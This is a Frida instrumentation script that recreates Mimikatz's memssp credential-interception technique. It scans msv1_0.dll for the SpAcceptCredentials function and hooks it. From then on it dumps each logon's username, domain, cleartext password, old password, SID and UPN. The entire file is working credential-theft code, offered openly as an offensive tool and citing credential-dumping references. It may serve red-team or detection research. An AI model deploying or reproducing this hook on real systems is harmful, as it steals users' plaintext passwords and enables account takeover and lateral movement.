//---------------------------------------------------------------------------------//
// Recreating memssp                                                               //
//                                                                                 //
// -=References=-                                                                  //
//                                                                                 //
// + https://ired.team/offensive-security/credential-access-and-credential-dumping //
//   /intercepting-logon-credentials-by-hooking-msv1_0-spacceptcredentials         //
//                                                                                 //
// + https://blog.xpnsec.com/exploring-mimikatz-part-2/                            //
//---------------------------------------------------------------------------------//

// Native function pointers
//-----------------------
var pConvertSidToStringSidA = Module.findExportByName('Advapi32.dll', 'ConvertSidToStringSidA');

// API prototype
//-----------------------
var fConvertSidToStringSidA = new NativeFunction(
    pConvertSidToStringSidA,
    "bool",
    [
        "pointer",
        "pointer"
    ]
);

// Enum's
//----------------------------------------------
var SECURITY_LOGON_TYPE = {
    UndefinedLogonType: 1,
    Interactive: 2,
    Network: 3,
    Batch: 4,
    Service: 5,
    Proxy: 6,
    Unlock: 7,
    NetworkCleartext: 8,
    NewCredentials: 9,
    RemoteInteractive: 10,
    CachedInteractive: 11,
    CachedRemoteInteractive: 12,
    CachedUnlock: 13
}

var PRIMARY_CREDENTIAL_FLAG = {
    PRIMARY_CRED_CLEAR_PASSWORD: 1,
    PRIMARY_CRED_OWF_PASSWORD: 2,
    PRIMARY_CRED_UPDATE: 3,
    PRIMARY_CRED_CACHED_LOGON: 4
}

// Helpers
//----------------------------------------------
function LogonType(flag) {
    if (flag == SECURITY_LOGON_TYPE.UndefinedLogonType) return "UndefinedLogonType";
    if (flag == SECURITY_LOGON_TYPE.Interactive) return "Interactive";
    if (flag == SECURITY_LOGON_TYPE.Network) return "Network";
    if (flag == SECURITY_LOGON_TYPE.Batch) return "Batch";
    if (flag == SECURITY_LOGON_TYPE.Service) return "Service";
    if (flag == SECURITY_LOGON_TYPE.Proxy) return "Proxy";
    if (flag == SECURITY_LOGON_TYPE.Unlock) return "Unlock";
    if (flag == SECURITY_LOGON_TYPE.NetworkCleartext) return "NetworkCleartext";
    if (flag == SECURITY_LOGON_TYPE.NewCredentials) return "NewCredentials";
    if (flag == SECURITY_LOGON_TYPE.RemoteInteractive) return "RemoteInteractive";
    if (flag == SECURITY_LOGON_TYPE.CachedInteractive) return "CachedInteractive";
    if (flag == SECURITY_LOGON_TYPE.CachedRemoteInteractive) return "CachedRemoteInteractive";
    if (flag == SECURITY_LOGON_TYPE.CachedUnlock) return "CachedUnlock";
}

function CredentialFlag(flag) {
    if (flag == PRIMARY_CREDENTIAL_FLAG.PRIMARY_CRED_CLEAR_PASSWORD) return "PRIMARY_CRED_CLEAR_PASSWORD";
    if (flag == PRIMARY_CREDENTIAL_FLAG.PRIMARY_CRED_OWF_PASSWORD) return "PRIMARY_CRED_OWF_PASSWORD";
    if (flag == PRIMARY_CREDENTIAL_FLAG.PRIMARY_CRED_UPDATE) return "PRIMARY_CRED_UPDATE";
    if (flag == PRIMARY_CREDENTIAL_FLAG.PRIMARY_CRED_CACHED_LOGON) return "PRIMARY_CRED_CACHED_LOGON";
}

// Arch specific offsets
var UNICODE_STRING_Size;
var UNICODE_STRING_BufferOffset;
var Arch_Pointer_Size;
if (Process.arch == "x64") {
    UNICODE_STRING_Size = 0x10;
    UNICODE_STRING_BufferOffset = 0x8;
    Arch_Pointer_Size = 0x8;
} else {
    UNICODE_STRING_Size = 0x8;
    UNICODE_STRING_BufferOffset = 0x4;
    Arch_Pointer_Size = 0x4;
}

// Get string from UNICODE_STRING struct
function GetUnicodeStringValue(pUNICODE_STRING) {
    var len = pUNICODE_STRING.readU16();
    if (len == 0) {
        return "N/A";
    } else {
        return ((pUNICODE_STRING.add(UNICODE_STRING_BufferOffset)).readPointer()).readUtf16String(len/2);
    }
}

// Convert SID to string SID representation
function StringSidFromSid(pUserSid) {
    // Heap alloc pointer sized mem
    var lplpsz = Memory.alloc(8)
    // Call function & read CLSID
    var CallResult = fConvertSidToStringSidA(pUserSid, lplpsz)
    if (CallResult != 0) {
        var SID_STRING = (lplpsz.readPointer()).readAnsiString();
        return SID_STRING;
    } else {
        return "N/A";
    }
}

// Scan for msv1_0!SpAcceptCredentials
//----------------------------------------------

// Module base -> msv1_0
var msv10Base = Module.findBaseAddress("msv1_0.dll");

// Byte pattern -> msv1_0!SpAcceptCredentials+0x0
var seqSpAcceptCredentials = "48 89 5c 24 08 48 89 6c 24 10" +
                             "48 89 74 24 18 57 48 83 ec 20" +
                             "49 8b d9 49 8b f8 8b f1 48 8b";

send("[>] Scanning for byte sequence..");
var matchArr = Memory.scanSync(msv10Base, 0x15000, seqSpAcceptCredentials)
if (matchArr.length == 1) {
    send("    |-> msv1_0!SpAcceptCredentials: " + matchArr[0].address);
}

// Hooks
//----------------------------------------------
Interceptor.attach(matchArr[0].address, {
    onEnter: function (args) {
        // Offset all the things
        var uDownlevelName = (args[2].add(8));
        var uDomainName = (args[2].add(8 + UNICODE_STRING_Size));
        var uPassword = (args[2].add(8 + (UNICODE_STRING_Size*2)));
        var uOldPassword = (args[2].add(8 + (UNICODE_STRING_Size*3)));
        var pSID = (args[2].add(8 + (UNICODE_STRING_Size*4))).readPointer();
        var iFlags = (args[2].add(8 + (UNICODE_STRING_Size*4) + Arch_Pointer_Size)).readU16();
        var uDnsDomainName = (args[2].add(12 + (UNICODE_STRING_Size*4) + Arch_Pointer_Size));
        var uUpn = (args[2].add(12 + (UNICODE_STRING_Size*5) + Arch_Pointer_Size));
        var uLogonServer = (args[2].add(12 + (UNICODE_STRING_Size*6) + Arch_Pointer_Size));

        var uPackagename;
        if (args[3].compare(0x0) == 0x0) {
            uPackagename = "N/A";
        } else {
            uPackagename = GetUnicodeStringValue(args[3]);
        }
        
        // Dump data
        send("\n[+] SpAcceptCredentials");
        send("    |-> SECURITY_LOGON_TYPE:      : " + LogonType(args[0]));
        send("    |-> PSECPKG_PRIMARY_CRED");
        send("        |_ LogonId                : " + args[2].readU64());
        send("        |_ DownlevelName          : " + GetUnicodeStringValue(uDownlevelName));
        send("        |_ DomainName             : " + GetUnicodeStringValue(uDomainName));
        send("        |_ Password               : " + GetUnicodeStringValue(uPassword));
        send("        |_ OldPassword            : " + GetUnicodeStringValue(uOldPassword));
        send("        |_ SID                    : " + StringSidFromSid(pSID));
        send("        |_ Flags                  : " + CredentialFlag(iFlags));
        send("        |_ DnsDomainName          : " + GetUnicodeStringValue(uDnsDomainName));
        send("        |_ Upn                    : " + GetUnicodeStringValue(uUpn));
        send("        |_ LogonServer            : " + GetUnicodeStringValue(uLogonServer));
        send("    |-> PSECPKG_SUPPLEMENTAL_CRED");
        send("        |_ PackageName            : " + uPackagename);
    },

    onLeave: function (retval) {
    }
});